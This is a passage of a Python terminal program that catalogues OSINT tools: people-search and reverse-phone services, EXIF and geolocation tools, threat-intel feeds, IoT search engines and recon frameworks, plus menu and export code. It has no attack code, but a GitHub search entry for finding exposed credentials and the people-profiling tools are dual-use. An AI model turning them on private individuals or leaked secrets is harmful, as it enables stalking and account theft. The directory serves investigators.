        "tools": [],
        "subcategories": {
            "People Search Engines": {
                "desc": "Aggregators that compile public records, social data, etc.",
                "tools": [
                    {"name": "Pipl (R)", "url": "https://pipl.com",
                     "flags": ["R"],
                     "purpose": "Deep web people search — aggregates public records, social, professional data.",
                     "usage": "Enter name/email/username/phone → get comprehensive profile.",
                     "notes": "Paid; considered one of the best people-search tools. Used by investigators."},
                    {"name": "Spokeo (R)", "url": "https://www.spokeo.com",
                     "flags": ["R"],
                     "purpose": "Aggregate public data: address, relatives, social profiles.",
                     "usage": "Enter name/address/phone/email → view profile.",
                     "notes": "US-focused; freemium model."},
                    {"name": "TruthFinder (R)", "url": "https://www.truthfinder.com",
                     "flags": ["R"],
                     "purpose": "Background check using public records.",
                     "usage": "Enter name and location → get background report.",
                     "notes": "US only; subscription required."},
                    {"name": "Intelius (R)", "url": "https://www.intelius.com",
                     "flags": ["R"],
                     "purpose": "People search: address, phone, relatives, criminal records.",
                     "usage": "Enter name → choose from results → purchase report.",
                     "notes": "US-focused; pay-per-report or subscription."},
                    {"name": "BeenVerified (R)", "url": "https://www.beenverified.com",
                     "flags": ["R"],
                     "purpose": "Background check on individuals using public data.",
                     "usage": "Enter name, email, or phone → view report.",
                     "notes": "Subscription-based; unlimited searches."},
                    {"name": "PeekYou", "url": "https://www.peekyou.com",
                     "flags": [],
                     "purpose": "Find someone's social profiles, usernames, and web presence.",
                     "usage": "Enter name → browse linked social accounts.",
                     "notes": "Free; good for social media footprint mapping."},
                ],
                "subcategories": {}
            },
            "Public Records": {
                "desc": "Government and judicial public records.",
                "tools": [
                    {"name": "PACER (R)", "url": "https://pacer.uscourts.gov",
                     "flags": ["R"],
                     "purpose": "US federal court case records access.",
                     "usage": "Register → search by name or case number → download documents.",
                     "notes": "$.10/page; registration required. Essential for US legal OSINT."},
                    {"name": "BlackBookOnline", "url": "https://www.blackbookonline.info",
                     "flags": [],
                     "purpose": "Directory of free public records databases by US state.",
                     "usage": "Select state → choose record type → use linked resource.",
                     "notes": "Free; aggregates links to state/county databases."},
                ],
                "subcategories": {}
            }
        }
    },
    "Phone Numbers": {
        "desc": "Investigate phone numbers — carrier, owner, spam reports.",
        "tools": [],
        "subcategories": {
            "Number Lookup": {
                "desc": "Identify phone number carrier and geographic data.",
                "tools": [
                    {"name": "Twilio Lookup (R)", "url": "https://www.twilio.com/lookup",
                     "flags": ["R"],
                     "purpose": "Validate phone numbers and get carrier/line type info via API.",
                     "usage": "API: GET /Lookups/v1/PhoneNumbers/<number>",
                     "notes": "Requires Twilio account. Pay-as-you-go pricing."},
                    {"name": "Truecaller (R)", "url": "https://www.truecaller.com",
                     "flags": ["R"],
                     "purpose": "Crowdsourced phone book — identify unknown callers.",
                     "usage": "Search phone number → see name if registered.",
                     "notes": "Registration required; widely used in India and Africa."},
                    {"name": "SpyDialer", "url": "https://www.spydialer.com",
                     "flags": [],
                     "purpose": "Reverse phone lookup — name, carrier, voicemail.",
                     "usage": "Enter phone number → view linked name/voicemail.",
                     "notes": "Free and no registration needed for basic lookups."},
                    {"name": "NumLookup", "url": "https://www.numlookup.com",
                     "flags": [],
                     "purpose": "Free reverse phone lookup for name and carrier.",
                     "usage": "Enter phone number → see owner info.",
                     "notes": "US numbers work best."},
                    {"name": "PhoneInfoga (T)", "url": "https://github.com/sundowndev/phoneinfoga",
                     "flags": ["T"],
                     "purpose": "Scan phone numbers for available information from public sources.",
                     "usage": "docker run sundowndev/phoneinfoga scan -n <number>\nor: go install + phoneinfoga scan -n +1XXXXXXXXXX",
                     "notes": "Open-source; supports multiple scanners. Great OSINT CLI tool."},
                    {"name": "Reverse Phone Lookup (M)", "url": "https://www.whitepages.com/reverse-phone/<number>",
                     "flags": ["M"],
                     "purpose": "White Pages reverse phone lookup.",
                     "usage": "Replace <number> in URL with target phone.",
                     "notes": "Free basic results; paid for detailed report."},
                ],
                "subcategories": {}
            }
        }
    },
    "Images / Video / Docs": {
        "desc": "Reverse image search, metadata extraction, and video analysis.",
        "tools": [],
        "subcategories": {
            "Reverse Image Search": {
                "desc": "Find where an image appears or who is in it.",
                "tools": [
                    {"name": "Google Images (M)", "url": "https://images.google.com",
                     "flags": ["M"],
                     "purpose": "Reverse image search across the web.",
                     "usage": "Click camera icon → upload image or paste URL.",
                     "notes": "Strongest general-purpose reverse image engine."},
                    {"name": "TinEye", "url": "https://tineye.com",
                     "flags": [],
                     "purpose": "Find where an image first appeared and where it has been used.",
                     "usage": "Upload image or paste URL → get list of matches with dates.",
                     "notes": "40+ billion indexed images. Best for first-seen analysis."},
                    {"name": "Yandex Images (M)", "url": "https://yandex.com/images/",
                     "flags": ["M"],
                     "purpose": "Russian reverse image search — excellent for facial recognition.",
                     "usage": "Click camera icon → upload image.",
                     "notes": "Often finds matches that Google/TinEye miss. Great for faces."},
                    {"name": "Bing Visual Search (M)", "url": "https://www.bing.com/visualsearch",
                     "flags": ["M"],
                     "purpose": "Microsoft's reverse image search with product recognition.",
                     "usage": "Upload image or paste URL.",
                     "notes": "Good complementary tool alongside Google."},
                ],
                "subcategories": {}
            },
            "Metadata / EXIF": {
                "desc": "Extract hidden metadata from images and documents.",
                "tools": [
                    {"name": "ExifTool (T)", "url": "https://exiftool.org",
                     "flags": ["T"],
                     "purpose": "Read, write, and edit metadata in images, audio, video, PDFs.",
                     "usage": "exiftool <filename>",
                     "notes": "The definitive metadata tool. GPS coords can reveal location."},
                    {"name": "Jeffrey's Exif Viewer", "url": "https://exif.regex.info/exif.cgi",
                     "flags": [],
                     "purpose": "Web-based EXIF viewer — see camera data, GPS, timestamps.",
                     "usage": "Upload image or paste URL → view full EXIF data.",
                     "notes": "Easy web alternative to ExifTool. Shows GPS map if present."},
                    {"name": "Metagoofil (T)", "url": "https://github.com/laramies/metagoofil",
                     "flags": ["T"],
                     "purpose": "Extract metadata from public documents (PDF, DOC, XLS, PPT).",
                     "usage": "python metagoofil.py -d example.com -t pdf -l 20 -o output/",
                     "notes": "Finds documents via Google and extracts author/software metadata."},
                    {"name": "Foca (T)", "url": "https://github.com/ElevenPaths/FOCA",
                     "flags": ["T"],
                     "purpose": "Fingerprint organisations via document metadata (Windows tool).",
                     "usage": "Windows GUI: enter domain → scan → extract metadata.",
                     "notes": "Finds internal hostnames, usernames, software versions in docs."},
                ],
                "subcategories": {}
            },
            "Video Analysis": {
                "desc": "Analyse and verify video content.",
                "tools": [
                    {"name": "InVID / WeVerify", "url": "https://weverify.eu/verification-plugin/",
                     "flags": [],
                     "purpose": "Verify video authenticity; extract keyframes for reverse image search.",
                     "usage": "Install browser extension → paste video URL → analyse frames.",
                     "notes": "Essential tool for journalists and OSINT investigators."},
                    {"name": "YouTube DataViewer", "url": "https://www.amnestytech.org/yt-dataviewer/",
                     "flags": [],
                     "purpose": "Extract metadata and thumbnails from YouTube videos for reverse searching.",
                     "usage": "Paste YouTube URL → get exact upload time and thumbnail links.",
                     "notes": "Amnesty International tool for video verification."},
                ],
                "subcategories": {}
            }
        }
    },
    "Threat Intelligence": {
        "desc": "Malware databases, CVE lookups, and threat actor tracking.",
        "tools": [],
        "subcategories": {
            "Malware": {
                "desc": "Analyse suspicious files and URLs for malware.",
                "tools": [
                    {"name": "VirusTotal", "url": "https://www.virustotal.com",
                     "flags": [],
                     "purpose": "Scan files, URLs, IPs, and domains against 70+ security engines.",
                     "usage": "Upload file or paste URL → see detection results.",
                     "notes": "Industry standard. Also has an API for automation."},
                    {"name": "Any.run (R)", "url": "https://any.run",
                     "flags": ["R"],
                     "purpose": "Interactive online sandbox — run malware and watch behaviour live.",
                     "usage": "Upload sample → see process tree, network calls, registry changes.",
                     "notes": "Free public analysis; paid for private sandboxing."},
                    {"name": "Hybrid Analysis", "url": "https://www.hybrid-analysis.com",
                     "flags": [],
                     "purpose": "Free malware analysis sandbox with detailed reports.",
                     "usage": "Upload file → choose environment → view full sandbox report.",
                     "notes": "Powered by CrowdStrike Falcon Sandbox. No registration for basic use."},
                    {"name": "MalwareBazaar", "url": "https://bazaar.abuse.ch/browse/",
                     "flags": [],
                     "purpose": "Repository of malware samples for threat intelligence.",
                     "usage": "Search by hash, tag, or signature → download sample or report.",
                     "notes": "Abuse.ch project; free access."},
                ],
                "subcategories": {}
            },
            "CVE / Vulnerabilities": {
                "desc": "Look up known vulnerabilities by CVE identifier.",
                "tools": [
                    {"name": "NVD - NIST", "url": "https://nvd.nist.gov/vuln/search",
                     "flags": [],
                     "purpose": "Official US National Vulnerability Database CVE lookup.",
                     "usage": "Search CVE-YYYY-NNNNN → view severity, CVSS, references.",
                     "notes": "Authoritative source for CVE data."},
                    {"name": "CVE Details", "url": "https://www.cvedetails.com",
                     "flags": [],
                     "purpose": "Browse CVE data with statistics and vendor breakdowns.",
                     "usage": "Search CVE or browse by vendor/product.",
                     "notes": "Good for comparing vulnerability history of vendors."},
                    {"name": "Exploit-DB", "url": "https://www.exploit-db.com",
                     "flags": [],
                     "purpose": "Archive of public exploits and proof-of-concept code.",
                     "usage": "Search CVE or product → download PoC if available.",
                     "notes": "Maintained by Offensive Security."},
                    {"name": "Shodan CVE Search (R)", "url": "https://cvedb.shodan.io",
                     "flags": ["R"],
                     "purpose": "Link CVEs to exposed vulnerable hosts on the internet.",
                     "usage": "Search CVE → see how many internet-facing hosts are vulnerable.",
                     "notes": "Shodan account required."},
                ],
                "subcategories": {}
            },
            "Threat Feeds": {
                "desc": "Live feeds of IOCs and threat actor intelligence.",
                "tools": [
                    {"name": "AlienVault OTX", "url": "https://otx.alienvault.com",
                     "flags": [],
                     "purpose": "Open Threat Exchange — community threat intelligence sharing.",
                     "usage": "Search IOC (IP/domain/hash) or browse pulses.",
                     "notes": "Free; huge community-contributed dataset."},
                    {"name": "ThreatFox", "url": "https://threatfox.abuse.ch",
                     "flags": [],
                     "purpose": "IOC sharing platform for malware C2, domains, IPs.",
                     "usage": "Search IOC → see malware family and threat actor association.",
                     "notes": "Abuse.ch project; free."},
                    {"name": "URLhaus", "url": "https://urlhaus.abuse.ch",
                     "flags": [],
                     "purpose": "Database of malicious URLs used for malware distribution.",
                     "usage": "Search URL or domain → see threat classification.",
                     "notes": "Abuse.ch project; also has an API."},
                    {"name": "MISP (T)", "url": "https://www.misp-project.org",
                     "flags": ["T"],
                     "purpose": "Open-source threat intelligence platform for sharing IOCs.",
                     "usage": "Self-hosted: docker-compose up\nThen import/export events via UI or API.",
                     "notes": "Standard in enterprise and government SOC environments."},
                ],
                "subcategories": {}
            }
        }
    },
    "Dark Web": {
        "desc": "Tools and resources for dark web OSINT (use Tor / ethical use only).",
        "tools": [],
        "subcategories": {
            "Search Engines": {
                "desc": "Search engines that index .onion content.",
                "tools": [
                    {"name": "Ahmia", "url": "https://ahmia.fi",
                     "flags": [],
                     "purpose": "Search engine for Tor hidden services (accessible via clearnet).",
                     "usage": "Search term → browse indexed .onion results.",
                     "notes": "Filters out CSAM. Accessible without Tor."},
                    {"name": "Hunchly Dark Web (R)", "url": "https://www.hunch.ly",
                     "flags": ["R"],
                     "purpose": "Dark web OSINT collection and monitoring tool.",
                     "usage": "Install → set up monitoring → capture dark web content.",
                     "notes": "Paid tool; used by professional investigators."},
                    {"name": "IntelX (Dark Web)", "url": "https://intelx.io",
                     "flags": ["R"],
                     "purpose": "Search dark web, pastes, and leaked data from clearnet.",
                     "usage": "Enter search term → filter by data source.",
                     "notes": "Freemium; premium for full results."},
                ],
                "subcategories": {}
            }
        }
    },
    "Geolocation Tools": {
        "desc": "Identify and verify geographic locations from images, videos, or metadata.",
        "tools": [],
        "subcategories": {
            "Mapping": {
                "desc": "Map services and street-level imagery for location verification.",
                "tools": [
                    {"name": "Google Maps", "url": "https://maps.google.com",
                     "flags": [],
                     "purpose": "Street view, satellite imagery, business information.",
                     "usage": "Search address or coordinates → switch to Street View.",
                     "notes": "Best overall mapping tool. Historic Street View available."},
                    {"name": "Bing Maps", "url": "https://www.bing.com/maps",
                     "flags": [],
                     "purpose": "Bird's eye view and street-level imagery.",
                     "usage": "Enter address → switch views.",
                     "notes": "Bird's eye 45-degree view sometimes better than Google."},
                    {"name": "Yandex Maps", "url": "https://yandex.com/maps",
                     "flags": [],
                     "purpose": "Best mapping for Russia, Eastern Europe, Central Asia.",
                     "usage": "Enter address → view panoramas.",
                     "notes": "Street-level imagery often more recent than Google for Russia."},
                    {"name": "GeoHints", "url": "https://www.geohints.com",
                     "flags": [],
                     "purpose": "Reference for identifying country/region from visual clues.",
                     "usage": "Browse categories (road signs, licence plates, vegetation).",
                     "notes": "Very useful for GeoGuessr-style OSINT geolocation challenges."},
                ],
                "subcategories": {}
            },
            "Geolocation from Images": {
                "desc": "Extract or infer location from images.",
                "tools": [
                    {"name": "GeoCreepy (T)", "url": "https://www.geocreepy.com",
                     "flags": ["T"],
                     "purpose": "Collect geolocation data from social network posts.",
                     "usage": "Install → select platform → enter username → map results.",
                     "notes": "Linux/Windows GUI app; plots geotagged post locations on map."},
                    {"name": "Pic2Map", "url": "https://www.pic2map.com",
                     "flags": [],
                     "purpose": "Extract GPS coordinates from image EXIF and show on map.",
                     "usage": "Upload image → see GPS location on map.",
                     "notes": "Only works if image has GPS EXIF data embedded."},
                    {"name": "SunCalc", "url": "https://www.suncalc.org",
                     "flags": [],
                     "purpose": "Calculate sun position and shadow direction for geolocation.",
                     "usage": "Move map to location → set date/time → check shadow direction.",
                     "notes": "Matches shadow angles in photos to confirm location/time."},
                ],
                "subcategories": {}
            }
        }
    },
    "Search Engines": {
        "desc": "Alternative and specialised search engines for OSINT queries.",
        "tools": [],
        "subcategories": {
            "General": {
                "desc": "Standard and privacy-focused search engines.",
                "tools": [
                    {"name": "Google", "url": "https://www.google.com",
                     "flags": [],
                     "purpose": "Largest index; best for dorking and deep web surface scraping.",
                     "usage": "Use advanced operators: site:, filetype:, inurl:, intitle:, cache:",
                     "notes": "Essential. Pair with Google Dork cheatsheet for maximum output."},
                    {"name": "Bing", "url": "https://www.bing.com",
                     "flags": [],
                     "purpose": "Alternative index — sometimes indexes what Google does not.",
                     "usage": "Use site:, ip:, filetype: operators.",
                     "notes": "Useful for pages de-indexed from Google."},
                    {"name": "DuckDuckGo", "url": "https://duckduckgo.com",
                     "flags": [],
                     "purpose": "Privacy-focused search; does not personalise results.",
                     "usage": "Use !bangs for instant redirection: !g, !so, !wiki etc.",
                     "notes": "Less tracking noise in results; bangs are very powerful."},
                    {"name": "Yandex", "url": "https://yandex.com",
                     "flags": [],
                     "purpose": "Russian search engine — strongest for CIS region content.",
                     "usage": "Standard search; also supports image reverse search.",
                     "notes": "Often indexes content not found elsewhere. Excellent for faces."},
                    {"name": "Baidu", "url": "https://www.baidu.com",
                     "flags": [],
                     "purpose": "Dominant Chinese search engine — best for Chinese-language OSINT.",
                     "usage": "Search in Chinese characters for best results.",
                     "notes": "Essential for targets with China connections."},
                ],
                "subcategories": {}
            },
            "Specialised / IoT": {
                "desc": "Search engines indexing devices, code, and technical data.",
                "tools": [
                    {"name": "Shodan (R)", "url": "https://www.shodan.io",
                     "flags": ["R"],
                     "purpose": "Internet-of-Things search engine for exposed devices and services.",
                     "usage": "Search: apache country:IN\nFilters: port:, os:, org:, hostname:, city:",
                     "notes": "Free account limited to 2 pages. Paid for full API."},
                    {"name": "Censys (R)", "url": "https://censys.io",
                     "flags": ["R"],
                     "purpose": "Search internet-wide scan data for hosts, certs, and protocols.",
                     "usage": "Search IP/domain → view certificates, protocols, ports.",
                     "notes": "Free researcher tier available via application."},
                    {"name": "Fofa", "url": "https://fofa.info",
                     "flags": ["R"],
                     "purpose": "Chinese IoT/infrastructure search engine (similar to Shodan).",
                     "usage": "Use query syntax: domain='example.com' && country='CN'",
                     "notes": "Excellent for China-based infrastructure. Free tier limited."},
                    {"name": "ZoomEye (R)", "url": "https://www.zoomeye.org",
                     "flags": ["R"],
                     "purpose": "Another Chinese cyberspace search engine.",
                     "usage": "Enter domain or IP → see exposed services.",
                     "notes": "Useful alternative to Shodan, especially for Asia Pacific."},
                    {"name": "GreyNoise (R)", "url": "https://www.greynoise.io",
                     "flags": ["R"],
                     "purpose": "Identify mass-scanning internet noise vs targeted attacks.",
                     "usage": "Enter IP → see if it is a scanner, crawler, or targeted attacker.",
                     "notes": "Free community API. Extremely useful for filtering threat data."},
                    {"name": "GitHub Code Search (D)", "url": "https://github.com/search",
                     "flags": ["D"],
                     "purpose": "Search public GitHub repositories for exposed secrets and code.",
                     "usage": "Search: 'api_key' 'example.com'\nFilter by language, repo, user.",
                     "notes": "Find accidentally exposed credentials, API keys, config files."},
                ],
                "subcategories": {}
            }
        }
    },
    "Encoding / Decoding": {
        "desc": "Tools to encode, decode, and analyse data formats.",
        "tools": [],
        "subcategories": {
            "Online Tools": {
                "desc": "Browser-based encoding and crypto utilities.",
                "tools": [
                    {"name": "CyberChef", "url": "https://gchq.github.io/CyberChef/",
                     "flags": [],
                     "purpose": "GCHQ's 'Cyber Swiss Army Knife' — encode, decode, encrypt, analyse.",
                     "usage": "Drag operations into recipe → paste input → see output.",
                     "notes": "Supports 300+ operations: Base64, XOR, regex, hashing, hex..."},
                    {"name": "Base64 Decode", "url": "https://www.base64decode.org",
                     "flags": [],
                     "purpose": "Encode/decode Base64 strings.",
                     "usage": "Paste Base64 → click Decode.",
                     "notes": "Simple; good for quick email header or token decoding."},
                    {"name": "URL Decoder/Encoder", "url": "https://meyerweb.com/eric/tools/dencoder/",
                     "flags": [],
                     "purpose": "URL-encode or decode strings.",
                     "usage": "Paste string → click Decode or Encode.",
                     "notes": "Useful for decoding obfuscated URLs in phishing analysis."},
                    {"name": "DCode.fr", "url": "https://www.dcode.fr/en",
                     "flags": [],
                     "purpose": "Large collection of cipher tools — Caesar, ROT, substitution, etc.",
                     "usage": "Select cipher type → paste ciphertext → decode.",
                     "notes": "Useful for CTF and basic steganography challenges."},
                ],
                "subcategories": {}
            }
        }
    },
    "Network / OSINT Frameworks": {
        "desc": "All-in-one OSINT and recon frameworks.",
        "tools": [],
        "subcategories": {
            "Recon Frameworks": {
                "desc": "Automated multi-source intelligence gathering platforms.",
                "tools": [
                    {"name": "Maltego (R)", "url": "https://www.maltego.com",
                     "flags": ["R", "T"],
                     "purpose": "Visual link analysis and data mining platform.",
                     "usage": "Install → create graph → run transforms on entities (domain, email, person).",
                     "notes": "Industry standard for relationship mapping. Free Community Edition available."},
                    {"name": "SpiderFoot (T)", "url": "https://github.com/smicallef/spiderfoot",
                     "flags": ["T"],
                     "purpose": "OSINT automation framework — 200+ modules, web UI.",
                     "usage": "pip install spiderfoot\nspiderfoot -l 127.0.0.1:5001\nBrowse to UI → start scan.",
                     "notes": "One of the most comprehensive open-source OSINT tools."},
                    {"name": "Recon-ng (T)", "url": "https://github.com/lanmaster53/recon-ng",
                     "flags": ["T"],
                     "purpose": "Metasploit-style web recon framework with workspaces and modules.",
                     "usage": "python recon-ng\nworkspaces create <name>\nmarketplace install all\nmodules load <module>",
                     "notes": "Modular; integrates with APIs for email, domains, social data."},
                    {"name": "theHarvester (T)", "url": "https://github.com/laramies/theHarvester",
                     "flags": ["T"],
                     "purpose": "Gather emails, subdomains, hosts, IPs from public sources.",
                     "usage": "theHarvester -d example.com -b all",
                     "notes": "Pre-installed in Kali Linux. Essential first-pass recon tool."},
                    {"name": "OSINT Framework", "url": "https://osintframework.com",
                     "flags": [],
                     "purpose": "The original web-based directory of OSINT resources (this framework).",
                     "usage": "Browse tree → click tool node → follow link.",
                     "notes": "By @jnordine. Source: github.com/lockfale/osint-framework"},
                ],
                "subcategories": {}
            }
        }
    }
}

# ─────────────────────────────────────────────────────────────────────────────
# FLAG RENDERING
# ─────────────────────────────────────────────────────────────────────────────
FLAG_LABELS = {
    "T": RED("[T] LOCAL INSTALL"),
    "D": YELLOW("[D] GOOGLE DORK"),
    "R": CYAN("[R] REGISTRATION"),
    "M": MAGENTA("[M] EDIT URL"),
}

FLAG_DESC = {
    "T": "Must be installed and run locally on your machine.",
    "D": "Uses a Google Dork (advanced search query).",
    "R": "Requires account registration.",
    "M": "The URL itself must be edited manually with your target.",
}


def flag_badge(flag: str) -> str:
    return FLAG_LABELS.get(flag, f"[{flag}]")


# ─────────────────────────────────────────────────────────────────────────────
# DISPLAY HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def clear():
    os.system("cls" if os.name == "nt" else "clear")


def banner():
    lines = [
        BOLD(CYAN("╔══════════════════════════════════════════════════════════════════════════════╗")),
        BOLD(CYAN("║                          O S I N T   F R A M E W O R K                       ║")),
        BOLD(CYAN("╚══════════════════════════════════════════════════════════════════════════════╝")),
        "",
        f"  {RED('[T]')} Local Install    {YELLOW('[D]')} Google Dork    "
        f"{CYAN('[R]')} Registration    {MAGENTA('[M]')} Edit URL",
        "",
    ]
    print("\n".join(lines))



def print_tool(tool: dict, indent: int = 4) -> None:
    pad = " " * indent
    flags = "  ".join(flag_badge(f) for f in tool.get("flags", []))
    print(f"\n{pad}{GREEN('●')} {BOLD(tool['name'])}")
    if flags:
        print(f"{pad}  {flags}")
    print(f"{pad}  {DIM('URL    :')} {tool['url']}")
    print(f"{pad}  {DIM('Purpose:')} {tool['purpose']}")
    # Wrap usage to terminal width
    usage_lines = tool["usage"].split("\n")
    print(f"{pad}  {DIM('Usage  :')}", end="")
    for i, line in enumerate(usage_lines):
        prefix = f"\n{pad}           " if i > 0 else " "
        print(f"{prefix}{YELLOW(line)}", end="")
    print()
    if tool.get("notes"):
        print(f"{pad}  {DIM('Notes  :')} {tool['notes']}")


def print_tree_line(label: str, depth: int, is_last: bool, prefix: str = "") -> str:
    connector = "└── " if is_last else "├── "
    return f"{prefix}{connector}{label}"


# ─────────────────────────────────────────────────────────────────────────────
# TREE PRINTER (visual, like the website)
# ─────────────────────────────────────────────────────────────────────────────

def _render_tree(node: dict, prefix: str = "", is_last: bool = True) -> list[str]:
    lines = []
    connector = "└── " if is_last else "├── "
    child_prefix = prefix + ("    " if is_last else "│   ")

    subcats = node.get("subcategories") or {}
    tools   = node.get("tools") or []

    # Print sub-categories
    subcat_items = list(subcats.items())
    for i, (sub_name, sub_node) in enumerate(subcat_items):
        is_last_sub = (i == len(subcat_items) - 1) and not tools
        icon = "📁"
        lines.append(f"{prefix}{'└── ' if is_last_sub else '├── '}{icon} {BOLD(sub_name)}"
                     + DIM(f"  ({sub_node.get('desc','')})" if sub_node.get('desc') else ""))
        lines.extend(_render_tree(sub_node, child_prefix if not is_last_sub else prefix + "    ", True))

    # Print tools
    for j, tool in enumerate(tools):
        is_last_tool = (j == len(tools) - 1)
        flag_str = " ".join(f"({f})" for f in tool.get("flags", []))
        label = f"{tool['name']} {DIM(flag_str)}" if flag_str else tool["name"]
        lines.append(f"{child_prefix}{'└── ' if is_last_tool else '├── '}🔧 {label}")

    return lines


def show_full_tree():
    banner()
    print(BOLD("OSINT FRAMEWORK TREE\n"))
    top_items = list(FRAMEWORK.items())
    for i, (cat_name, cat_node) in enumerate(top_items):
        is_last = (i == len(top_items) - 1)
        connector = "└── " if is_last else "├── "
        child_prefix = "    " if is_last else "│   "
        print(f"{connector}{CYAN('📂')} {BOLD(CYAN(cat_name))}"
              + DIM(f"  — {cat_node.get('desc','')}"))
        lines = _render_tree(cat_node, child_prefix, True)
        for line in lines:
            print(line)
    print()


# ─────────────────────────────────────────────────────────────────────────────
# NAVIGATION
# ─────────────────────────────────────────────────────────────────────────────

def _collect_all_tools() -> list[dict]:
    """Flatten all tools into a list with their category path."""
    result = []
    def _walk(node: dict, path: list[str]):
        for t in node.get("tools", []):
            result.append({"tool": t, "path": path[:]})
        for sub_name, sub_node in (node.get("subcategories") or {}).items():
            _walk(sub_node, path + [sub_name])
    for cat_name, cat_node in FRAMEWORK.items():
        _walk(cat_node, [cat_name])
    return result


def query_framework(query: str):
    """Search all categories, subcategories, and tool names."""
    q = query.lower()
    results = []
    all_tools = _collect_all_tools()
    for entry in all_tools:
        path_str = " > ".join(entry["path"]).lower()
        tool = entry["tool"]
        if (q in tool["name"].lower() or
                q in path_str or
                q in tool.get("purpose", "").lower()):
            results.append(entry)

    if not results:
        print(f"\n{YELLOW('No results found for:')} {query}\n")
        return

    print(f"\n{GREEN('Results for:')} {BOLD(query)}  ({len(results)} tool(s) found)\n")
    for entry in results:
        path_display = " > ".join(entry["path"])
        print(f"  {DIM('Category:')} {CYAN(path_display)}")
        print_tool(entry["tool"])
        print()


def navigate_category(cat_name: str, cat_node: dict):
    """Drill into a top-level category."""
    while True:
        clear()
        banner()
        print(f"{BOLD(CYAN(cat_name))}\n{DIM(cat_node.get('desc',''))}\n")

        subcats  = list((cat_node.get("subcategories") or {}).items())
        top_tools = cat_node.get("tools") or []

        options = []
        for sub_name, sub_node in subcats:
            tool_count = len(sub_node.get("tools") or [])
            options.append(("subcategory", sub_name, sub_node, tool_count))

        for t in top_tools:
            options.append(("tool", t, None, 0))

        # Display options
        for idx, opt in enumerate(options, 1):
            if opt[0] == "subcategory":
                print(f"  {BOLD(str(idx)+'.')} {CYAN('📁')} {opt[1]}  "
                      + DIM(f"({opt[3]} tools)  {(opt[2] or {}).get('desc','')}"))
            else:
                t = opt[1]
                flags = " ".join(f"({f})" for f in t.get("flags",[]))
                print(f"  {BOLD(str(idx)+'.')} 🔧 {t['name']} {DIM(flags)}")

        print(f"\n  {BOLD('0.')} ← Back")
        choice = input(f"\n{BOLD('Select')} [0-{len(options)}]: ").strip()

        if choice == "0":
            break
        if not choice.isdigit() or not (1 <= int(choice) <= len(options)):
            continue

        selected = options[int(choice) - 1]

        if selected[0] == "subcategory":
            navigate_subcategory(selected[1], selected[2])
        else:
            clear()
            banner()
            print_tool(selected[1])
            action = input(f"\n  {BOLD('[O]')}pen in browser  {BOLD('[B]')}ack: ").strip().lower()
            if action == "o":
                webbrowser.open(selected[1]["url"])
            # loop back regardless


def navigate_subcategory(sub_name: str, sub_node: dict):
    """Drill into a subcategory and show its tools."""
    while True:
        clear()
        banner()
        print(f"{BOLD(CYAN(sub_name))}\n{DIM(sub_node.get('desc',''))}\n")

        tools = sub_node.get("tools") or []
        inner_subs = list((sub_node.get("subcategories") or {}).items())

        options = []
        for inner_sub_name, inner_sub_node in inner_subs:
            options.append(("subcategory", inner_sub_name, inner_sub_node))
        for t in tools:
            options.append(("tool", t, None))

        for idx, opt in enumerate(options, 1):
            if opt[0] == "subcategory":
                print(f"  {BOLD(str(idx)+'.')} {CYAN('📁')} {opt[1]}")
            else:
                t = opt[1]
                flags = " ".join(f"({f})" for f in t.get("flags", []))
                print(f"  {BOLD(str(idx)+'.')} 🔧 {t['name']}  {DIM(flags)}")

        print(f"\n  {BOLD('0.')} ← Back")
        choice = input(f"\n{BOLD('Select')} [0-{len(options)}]: ").strip()

        if choice == "0":
            break
        if not choice.isdigit() or not (1 <= int(choice) <= len(options)):
            continue

        selected = options[int(choice) - 1]
        if selected[0] == "subcategory":
            navigate_subcategory(selected[1], selected[2])
        else:
            clear()
            banner()
            print_tool(selected[1])
            action = input(f"\n  {BOLD('[O]')}pen in browser  {BOLD('[B]')}ack: ").strip().lower()
            if action == "o":
                webbrowser.open(selected[1]["url"])


# ─────────────────────────────────────────────────────────────────────────────
# EXPORT
# ─────────────────────────────────────────────────────────────────────────────

def export_json(filename: str = "osint_framework_export.json"):
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(FRAMEWORK, f, indent=2, ensure_ascii=False)
    print(f"{GREEN('Exported JSON:')} {filename}")


def export_csv(filename: str = "osint_framework_export.csv"):
    all_tools = _collect_all_tools()
    fieldnames = ["category_path", "name", "url", "flags", "purpose", "usage", "notes"]
    with open(filename, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        for entry in all_tools:
            t = entry["tool"]
            writer.writerow({
                "category_path": " > ".join(entry["path"]),
                "name": t["name"],
                "url": t["url"],
                "flags": ",".join(t.get("flags", [])),
                "purpose": t.get("purpose", ""),
                "usage": t.get("usage", "").replace("\n", " | "),
                "notes": t.get("notes", ""),
            })
    print(f"{GREEN('Exported CSV:')} {filename}")


# ─────────────────────────────────────────────────────────────────────────────
# MAIN INTERACTIVE LOOP
# ─────────────────────────────────────────────────────────────────────────────

def main_menu():
    while True:
        clear()
        banner()
        cats = list(FRAMEWORK.items())
        print(BOLD("TOP-LEVEL CATEGORIES\n"))
        for i, (cat_name, cat_node) in enumerate(cats, 1):
            sub_count = len(cat_node.get("subcategories") or {})
            print(f"  {BOLD(str(i)+'.')} {CYAN('📂')} {cat_name}  "
                  + DIM(f"[{sub_count} subcategories]  {cat_node.get('desc','')}"))

        print(f"\n  {BOLD('T.')} Show Full Tree")
        print(f"  {BOLD('Q.')} Query / Search tools")
        print(f"  {BOLD('E.')} Export (JSON/CSV)")
        print(f"  {BOLD('X.')} Exit")

        choice = input(f"\n{BOLD('Select')} [1-{len(cats)}/T/Q/E/X]: ").strip().lower()

        if choice == "x":
            print(f"\n{DIM('Happy Hunting. Stay legal. Stay ethical.')}\n")
            sys.exit(0)
        elif choice == "t":
            clear()
            show_full_tree()
            input(f"{DIM('Press Enter to return...')}")
        elif choice == "q":
            q = input(f"\n{BOLD('Search query:')} ").strip()
            if q:
                clear()
                banner()
                query_framework(q)
                input(f"\n{DIM('Press Enter to return...')}")
        elif choice == "e":
            fmt = input(f"\n{BOLD('Format')} [json/csv]: ").strip().lower()
            if fmt == "json":
                export_json()
            elif fmt == "csv":
                export_csv()
            else:
                print(YELLOW("Unknown format. Use 'json' or 'csv'."))
            input(f"\n{DIM('Press Enter to return...')}")
        elif choice.isdigit() and 1 <= int(choice) <= len(cats):
            idx = int(choice) - 1
            navigate_category(cats[idx][0], cats[idx][1])


# ─────────────────────────────────────────────────────────────────────────────
# CLI ENTRY POINT
